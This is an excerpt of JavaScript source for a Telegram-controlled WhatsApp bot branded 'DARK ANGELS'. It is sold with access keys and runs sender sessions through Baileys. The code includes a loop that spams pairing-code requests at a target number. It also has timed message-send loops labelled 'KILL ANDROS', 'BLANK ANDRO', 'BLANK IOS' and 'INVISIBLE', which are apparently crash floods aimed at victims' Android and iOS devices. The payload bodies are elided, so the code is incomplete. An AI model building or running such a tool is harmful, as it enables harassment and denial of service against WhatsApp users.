...
const ownerIds = [6696150439]; // contoh chat_id owner 
...
const delActive = (BotNumber) => {
  ...
  console.log(`✓ Nomor ${BotNumber} succes dihapus dari sesi`);
};
    ...
    if (connection === "connecting") {
      ...
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "DARKANGL");
...
const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  ...
  try {
    ...
    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "DARKANGL");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;
...
bot.command("start", async (ctx) => {
  ...
  const teks = `
<b>Olá Sir, ${username}</b>

<blockquote><b>「 𝐃𝐀𝐑𝐊 𝐀𝐍𝐆𝐄𝐋𝐒 」</b></blockquote>
⸸ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @vinzzloww
⸸ ᴛɪᴘᴏ  : 𝟐.𝟎 𝐕𝐢𝐩𝐁𝐮𝐲𝐎𝐧𝐥𝐲
⸸ sᴄʀɪᴘᴛ  : 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐃𝐀𝐑𝐊 𝐀𝐍𝐆𝐄𝐋𝐒

<blockquote>⦏ 𝗠𝗘𝗡𝗨 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 ⦐</blockquote>
│ꔹ /addbot
│ꔹ /listbot
│ꔹ /delbot
│ꔹ /ckey
...
`;
  ...
  const keyboard = new InlineKeyboard().url(
    "[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]",
    "https://t.me/+pmybLiJ6QVxmMzNl"
  );

  // Kirim pesan dengan foto terlebih dahulu
  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/s0lus0.png" },
    {
      caption: teks,
      parse_mode: "HTML",
  ...
  await ctx.replyWithAudio(
    { url: "https://files.catbox.moe/ostis2.wav" }, // Ganti dengan URL audio yang diinginkan
    {
      caption: "🎵 BLACK ANGELS",
      parse_mode: "HTML"
    }
  );
});
...
bot.command("addbot", async (ctx) => {
  ...
  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /addbot 62xxx", { parse_mode: "HTML" });
  }
...
bot.command("listbot", (ctx) => {
  ...
  if (sessions.size === 0) return ctx.reply("Gak ada sender cukk, tambahin lah😘");
...
bot.command("delbot", async (ctx) => {
  ...
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 62xxx", { parse_mode: "HTML" });
...
bot.command("ckey", async (ctx) => {
  ...
  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Falha\n\nExample :\n• /ckey vinz,30d\n• /ckey vinz,30d,ganteng", { parse_mode: "HTML" });
  }
      ...
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]",
              url: "https://t.me/+pmybLiJ6QVxmMzNl"
            }
          ]
        ]
      }
...
bot.command("addacces", (ctx) => {
  ...
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addacces 6696150439", { parse_mode: "HTML" });
...
bot.command("delacces", (ctx) => {
  ...
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delacces 6696150439", { parse_mode: "HTML" });
...
bot.command("addowner", (ctx) => {
  ...
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addowner 6696150439", { parse_mode: "HTML" });
...
bot.command("delowner", (ctx) => {
  ...
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delowner 6696150439", { parse_mode: "HTML" });
...
app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "DARK-ANGELS", "Login.html");
...
app.get("/execution", (req, res) => {
  try {
    ...
    const filePath = "./DARK-ANGELS/Login.html";
...
┌────────────────────────────────┐
│ ${count + 1}/8 DARK ANGELS KILL ANDROS 📟
└────────────────────────────────┘
  `));
        count++;
        ...
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade DARK-ANGELS 🍂 777 ).`));
          count = 0;
          batch++;
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 35) {
        ...
        console.log(chalk.yellow(`
┌─────────────────────────────────┐
│ ${count + 1}/2 DARK ANGELS BLANK ANDRO 📟
└─────────────────────────────────┘
  `));
        count++;
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 35) {
        ...
        console.log(chalk.yellow(`
┌───────────────────────────────┐
│ ${count + 1}/10 DARK ANGELS BLANK IOS 📟
└───────────────────────────────┘
  `));
        count++;
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 35) {
        ...
        console.log(chalk.yellow(`
┌──────────────────────────────┐
│ ${count + 1}/1 DARK ANGELS BLANK IOS 📟
└──────────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3500);
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 35) {
        ...
        console.log(chalk.yellow(`
┌────────────────────────────────┐
│ ${count + 1}/400 DARK ANGELS INVISIBLE 🕊️
└────────────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
...
const executionPage = (
  ...
  const filePath = path.join(__dirname, "DARK-ANGELS", "DarkAngels.html");
  ...
  try {
    ...
    console.error("Gagal membaca file DarkAngels.html:", err);
